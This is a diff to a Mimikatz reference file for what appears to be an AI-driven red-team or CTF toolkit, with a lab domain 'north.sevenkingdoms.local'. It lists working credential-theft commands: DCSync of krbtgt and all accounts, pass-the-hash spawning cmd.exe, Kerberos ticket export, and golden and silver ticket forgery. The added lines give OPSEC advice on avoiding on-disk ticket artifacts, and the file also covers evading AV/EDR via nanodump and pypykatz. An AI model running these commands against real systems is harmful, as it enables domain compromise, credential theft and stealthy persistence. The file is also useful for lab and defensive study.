@@ -33,7 +33,9 @@ usage_examples:
     args: "lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt"
   - description: DCSync all accounts in domain
     args: "lsadump::dcsync /domain:north.sevenkingdoms.local /all /csv"
-  - description: List all Kerberos tickets from LSASS
+  - description: List Kerberos tickets from the current session without writing files
+    args: "kerberos::list"
+  - description: Export Kerberos tickets to disk (intentional artifact)
     args: "kerberos::list /export"
   - description: Pass-the-hash — inject NTLM hash into a new logon session
     args: "sekurlsa::pth /user:administrator /domain:NORTH /ntlm:<nthash> /run:cmd.exe"
@@ -48,6 +50,12 @@ opsec_notes: |
   prefer nanodump (BOF) or Cobalt Strike's built-in approach over raw mimikatz on LSASS.
   DCSync via mimikatz is network-based (replication RPC) and generates event 4662 on DCs
   that have object access auditing enabled.
+  Mimikatz Kerberos commands have sharp disk-artifact edges: `kerberos::golden` and
+  silver-ticket-style `kerberos::golden /service:...` write `ticket.kirbi` by default
+  unless `/ptt` is supplied; `/ticket:<path>` intentionally chooses the output file.
+  `kerberos::list /export` and `sekurlsa::tickets /export` write one `.kirbi` per
+  ticket into the current working directory. In a C2/CTF workflow, prefer `/ptt` for
+  forged tickets and omit `/export` unless the objective explicitly needs ticket files.
 gotchas: |
   `privilege::debug` must succeed before most LSASS operations — if it fails, check
   if SeDebugPrivilege is present in the token. WDigest cleartext credentials require
@@ -82,12 +90,12 @@ common_args:
   kerberos::list:
     name: kerberos::list
     description: List Kerberos tickets in the current logon session
-    typical_values: [flag-only, "/export"]
+    typical_values: [flag-only, "/export writes .kirbi files to cwd"]
   kerberos::golden:
     name: kerberos::golden
-    description: Forge a Golden Ticket given domain SID and krbtgt hash
+    description: Forge a Golden Ticket given domain SID and krbtgt hash; use /ptt to avoid writing ticket.kirbi
     typical_values: ["/user:X /domain:X /sid:X /krbtgt:X /ptt"]
-last_updated: 2026-05-29
+last_updated: 2026-06-08
 ---
 
 # Mimikatz
@@ -104,7 +112,8 @@ ships Mimikatz natively — operators don't need to upload it for most use cases
 - `lsadump::dcsync` — pull a domain account's credential material via synthetic DC replication (no LSASS touch on the DC)
 - `sekurlsa::pth` — inject an NTLM hash into a new logon session (pass-the-hash without cracking)
 - `sekurlsa::minidump` — parse a nanodump/procdump output offline to extract credentials
-- `kerberos::list /export` — dump Kerberos tickets from the current session
+- `kerberos::list` — list Kerberos tickets from the current session without writing files
+- `kerberos::list /export` — dump Kerberos tickets from the current session to `.kirbi` files in the current directory
 - `kerberos::golden` — forge Golden Ticket given krbtgt hash
 
 ## How Sage uses this
@@ -124,13 +133,20 @@ Text-format output to stdout. Key fields:
 - `sekurlsa::logonpasswords`: per-session blocks with domain, user, NTLM, SHA1, and (if available) cleartext password
 - `lsadump::dcsync`: hash block with rc4_hmac_nt (NTLM), aes128_cbc, aes256_cts for the target account
 - `sekurlsa::pth`: spawns new process in the specified logon session
-- `kerberos::list /export`: writes .kirbi ticket files to the current directory
+- `kerberos::golden` without `/ptt`: writes `ticket.kirbi` to the current directory; with `/ptt`, injects into the current logon session instead
+- `kerberos::list /export` and `sekurlsa::tickets /export`: write `.kirbi` ticket files to the current directory
 
 ## OPSEC considerations
 Raw mimikatz.exe is caught by virtually all AV/EDR products. The recommended path for Apollo
 operators is Apollo's native `mimikatz` command (embedded). For environments where even embedded
 Mimikatz is flagged, consider nanodump (BOF) → pypykatz parsing pipeline to avoid any
 Mimikatz-derived code on the target.
+
+Ticket OPSEC: do not run `kerberos::list /export` or `sekurlsa::tickets /export` from a user's
+Desktop unless you intentionally want visible `.kirbi` files there. Run `kerberos::list` for
+enumeration only. For forged golden/silver tickets, include `/ptt` so Mimikatz submits the ticket
+to the current session instead of writing the default `ticket.kirbi`; use `/ticket:<path>` only
+when a file artifact is part of the plan.
 
 DCSync is particularly detectable: it generates domain controller event 4662 (object access
 with Replicating Directory Changes All) and Sysmon-equivalent network events when a non-DC
@@ -172,7 +188,8 @@ dump + local parsing over DCSync.
 | `sekurlsa::cloudap` | Azure AD / AAD credentials |
 | `sekurlsa::pth /user /domain /ntlm /aes128 /aes256 /run` | Pass-the-hash / pass-the-key |
 | `sekurlsa::minidump FILE` | Load minidump as LSASS source |
-| `sekurlsa::tickets /export` | Export all Kerberos tickets from LSASS to .kirbi files |
+| `sekurlsa::tickets` | Display Kerberos tickets from LSASS without exporting files |
+| `sekurlsa::tickets /export` | Export all Kerberos tickets from LSASS to `.kirbi` files in cwd |
 
 ### Key commands — lsadump module
 
@@ -192,11 +209,11 @@ dump + local parsing over DCSync.
 | Command | Description |
 |---------|-------------|
 | `kerberos::list` | List tickets in current session |
-| `kerberos::list /export` | Export tickets to .kirbi files |
+| `kerberos::list /export` | Export tickets to `.kirbi` files in cwd |
 | `kerberos::ptt TICKET` | Pass-the-ticket: inject kirbi file or base64 ticket |
 | `kerberos::purge` | Purge all tickets from current session |
-| `kerberos::golden /user /domain /sid /krbtgt /ptt` | Forge Golden Ticket |
-| `kerberos::silver /user /domain /sid /target /service /rc4 /ptt` | Forge Silver Ticket |
+| `kerberos::golden /user /domain /sid /krbtgt /ptt` | Forge Golden Ticket and inject in memory; omitting `/ptt` writes `ticket.kirbi` |
+| `kerberos::golden /user /domain /sid /target /service /rc4 /ptt` | Forge Silver Ticket and inject in memory; omitting `/ptt` writes `ticket.kirbi` |
 
 ### sekurlsa::pth argument listing
 
